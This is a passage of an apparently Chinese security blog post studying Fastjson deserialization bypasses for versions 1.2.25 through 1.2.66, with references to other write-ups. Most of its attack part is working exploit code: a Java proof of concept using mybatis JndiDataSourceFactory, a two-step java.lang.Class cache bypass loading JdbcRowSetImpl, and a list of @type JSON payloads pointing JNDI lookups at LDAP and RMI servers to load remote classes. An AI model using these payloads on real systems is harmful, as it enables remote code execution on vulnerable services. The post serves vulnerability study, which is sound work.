+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/352f0278/20260126150409222.png" alt="image.png"><br>这里除了会对L和;进行提取之外，还会对 [ 进行提取,所以可以在类前加[但是，在反序列化时还要满足特定的条件，否则会报错，我们来看一下。<br><img src="/posts/352f0278/20260126151105433.png" alt="image.png"><br>这里会对最后字符的内容是否时“[”，“{”进行校验，所以要添加上，防止报错。</p>
+<h2 id="1-2-25-1-2-45"><a href="#1-2-25-1-2-45" class="headerlink" title="1.2.25-1.2.45"></a>1.2.25-1.2.45</h2><p>前提条件：要存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。<br>放个依赖包</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">3.4</span><span class="number">.6</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure>
+<p>exp</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> {  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span><span class="string">"{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\","</span> +  </span><br><span class="line">                <span class="string">"\"properties\":{\"data_source\":\"rmi://localhost:1099/RO\"}}"</span>;  </span><br><span class="line">        JSON.parse(json);  </span><br><span class="line">  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>这个在45之前的版本是不在黑名单里面的，所以可以利用的。<br><img src="/posts/352f0278/20260126160800779.png" alt="image.png"><br>再来看这里有很明显的jndi注入对吧。<br>所以绕过成功</p>
+<h2 id="1-2-25-1-2-47"><a href="#1-2-25-1-2-47" class="headerlink" title="1.2.25-1.2.47"></a>1.2.25-1.2.47</h2><p>这个的绕过方法是基于checkAutoType()函数绕过的，并且不需要开启AutoTypeSupport，大致思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map缓存中，从而绕过AutoType的检测，因此需要将payload分两次发送，第一次是加载，第二次是执行，默认情况下，没有遇到加载的类checkAutoType()就会抛出异常终止程序。<br>以下是exp</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> {  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"</span>  </span><br><span class="line">                + <span class="string">"\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span>  </span><br><span class="line">                + <span class="string">"\"dataSourceName\":\"rmi://localhost:1099/RO\",\"autoCommit\":true}}"</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/posts/352f0278/20260126162146127.png" alt="image.png"><br>具体的分析大家可以看<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#0x08-1-2-25-1-2-47%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87">Java反序列化Fastjson篇03-Fastjson各版本绕过分析 | Drunkbaby’s Blog</a>我具体就不分析了</p>
+<h2 id="后续版本的链子"><a href="#后续版本的链子" class="headerlink" title="后续版本的链子"></a>后续版本的链子</h2><h3 id="Fastjson1-2-5-1-2-59"><a href="#Fastjson1-2-5-1-2-59" class="headerlink" title="Fastjson1.2.5-1.2.59"></a>Fastjson1.2.5-1.2.59</h3><p>需要开启<strong>AutoType</strong></p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">{<span class="string">"@type"</span>:<span class="string">"com.zaxxer.hikari.HikariConfig"</span>,<span class="string">"metricRegistry"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>}</span><br><span class="line">{<span class="string">"@type"</span>:<span class="string">"com.zaxxer.hikari.HikariConfig"</span>,<span class="string">"healthCheckRegistry"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Fastjson1-2-5-1-2-60"><a href="#Fastjson1-2-5-1-2-60" class="headerlink" title="Fastjson1.2.5-1.2.60"></a>Fastjson1.2.5-1.2.60</h3><p>需要开启<strong>AutoType</strong></p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">{<span class="string">"@type"</span>:<span class="string">"oracle.jdbc.connector.OracleManagedConnectionFactory"</span>,<span class="string">"xaDataSourceName"</span>:<span class="string">"rmi://10.10.20.166:1099/ExportObject"</span>}</span><br><span class="line"></span><br><span class="line">{<span class="string">"@type"</span>:<span class="string">"org.apache.commons.configuration.JNDIConfiguration"</span>,<span class="string">"prefix"</span>:<span class="string">"ldap://10.10.20.166:1389/ExportObject"</span>}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Fastjson1-2-5-1-2-61"><a href="#Fastjson1-2-5-1-2-61" class="headerlink" title="Fastjson1.2.5-1.2.61"></a>Fastjson1.2.5-1.2.61</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="string">"@type"</span>:<span class="string">"org.apache.commons.proxy.provider.remoting.SessionBeanProvider"</span>,<span class="string">"jndiName"</span>:<span class="string">"ldap://localhost:1389/Exploi</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson <=1.2.62"></a>Fastjson &lt;=1.2.62</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="string">"@type"</span>:<span class="string">"org.apache.xbean.propertyeditor.JndiConverter"</span>,</span><br><span class="line">  <span class="string">"AsText"</span>:<span class="string">"rmi://127.0.0.1:1099/exploit"</span></span><br><span class="line">}<span class="string">";</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Fastjson-1"><a href="#Fastjson-1" class="headerlink" title="Fastjson <=1.2.66"></a>Fastjson &lt;=1.2.66</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="string">"@type"</span>:<span class="string">"org.apache.shiro.jndi.JndiObjectFactory"</span>,</span><br><span class="line">  <span class="string">"resourceName"</span>:<span class="string">"ldap://192.168.80.1:1389/Calc"</span></span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后续版本的绕过还有很多，我就不一一总结了，大家也可以看看别的文章哦</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14309">Java中Fastjson各版本漏洞对抗史与总结-先知社区</a><br><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#0x09-Fastjson-lt-x3D-1-2-61-%E9%80%9A%E6%9D%80">Java反序列化Fastjson篇03-Fastjson各版本绕过分析 | Drunkbaby’s Blog</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io">红烧花园宝宝</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io/posts/352f0278/">https://lxu2n.github.io/posts/352f0278/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lxu2n.github.io" target="_blank">红烧花园宝宝</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/422832ee/" title="fastjson2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">fastjson2</div></div><div class="info-2"><div class="info-item-1">前言从fastjson的1.2.24版本开始 环境jdk用的是8u65（方便一点，高版本的话还得进行绕过）Maven 3.6.31.2.22 &lt;= Fastjson &lt;= 1.2.24  依赖导入 1234567891011121314151617181920&lt;dependency&gt;      &lt;groupId&gt;com.unboundid&lt;/groupId&gt;      &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;      &lt;version&gt;4.0.9&lt;/version&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;commons-io&lt;/groupId&gt;      &lt;artifactId&gt;commons-io&lt;/artifactId&gt;      &lt;version&gt;2.5&lt;/version&gt;...</div></div></div></a></nav><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">红烧花园宝宝</div><div class="author-info-description">生命只有一次,我只能爱你一世</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LXu2n/LXu2n.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson1-2-25%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D%E7%9A%84"><span class="toc-number">2.</span> <span class="toc-text">fastjson1.2.25如何修复的</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#autoTypeSupport"><span class="toc-number">2.1.</span> <span class="toc-text">autoTypeSupport</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">寻找利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%89%8D%E7%9A%84%E5%88%97%E8%A1%A8"><span class="toc-number">3.1.</span> <span class="toc-text">目前的列表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%89%8D%E6%9C%AA%E7%9F%A5%E7%9A%84%E5%88%97%E8%A1%A8"><span class="toc-number">3.2.</span> <span class="toc-text">目前未知的列表</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%84%E7%89%88%E6%9C%AC%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">各版本的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25-1-2-41"><span class="toc-number">4.1.</span> <span class="toc-text">1.2.25-1.2.41</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">4.1.1.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25-1-2-42"><span class="toc-number">4.2.</span> <span class="toc-text">1. 2.25-1.2.42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25-1-2-43"><span class="toc-number">4.3.</span> <span class="toc-text">1.2.25-1.2.43</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">4.3.1.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25-1-2-45"><span class="toc-number">4.4.</span> <span class="toc-text">1.2.25-1.2.45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25-1-2-47"><span class="toc-number">4.5.</span> <span class="toc-text">1.2.25-1.2.47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BB%AD%E7%89%88%E6%9C%AC%E7%9A%84%E9%93%BE%E5%AD%90"><span class="toc-number">4.6.</span> <span class="toc-text">后续版本的链子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson1-2-5-1-2-59"><span class="toc-number">4.6.1.</span> <span class="toc-text">Fastjson1.2.5-1.2.59</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson1-2-5-1-2-60"><span class="toc-number">4.6.2.</span> <span class="toc-text">Fastjson1.2.5-1.2.60</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson1-2-5-1-2-61"><span class="toc-number">4.6.3.</span> <span class="toc-text">Fastjson1.2.5-1.2.61</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson"><span class="toc-number">4.6.4.</span> <span class="toc-text">Fastjson &lt;=1.2.62</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson-1"><span class="toc-number">4.6.5.</span> <span class="toc-text">Fastjson &lt;=1.2.66</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/352f0278/" title="fastjson3">fastjson3</a><time datetime="2026-01-26T08:38:51.000Z" title="发表于 2026-01-26 16:38:51">2026-01-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/422832ee/" title="fastjson2">fastjson2</a><time datetime="2026-01-23T12:33:17.000Z" title="发表于 2026-01-23 20:33:17">2026-01-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/db216354/" title="fastjson1">fastjson1</a><time datetime="2026-01-20T06:17:45.000Z" title="发表于 2026-01-20 14:17:45">2026-01-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/50c249a4/" title="JNDI注入">JNDI注入</a><time datetime="2026-01-14T09:00:03.000Z" title="发表于 2026-01-14 17:00:03">2026-01-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/3dd769b8/" title="moectf2025_第23关">moectf2025_第23关</a><time datetime="2026-01-07T10:05:31.000Z" title="发表于 2026-01-07 18:05:31">2026-01-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©2025 - 2026 By 红烧花园宝宝</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'LXu2n/LXu2n.github.io',
+      'data-repo-id': 'R_kgDOOuja2g',
+      'data-category-id': 'DIC_kwDOOuja2s4C020T',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script defer="" src="/js/bubble.js"></script><script src="/styles/fish.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
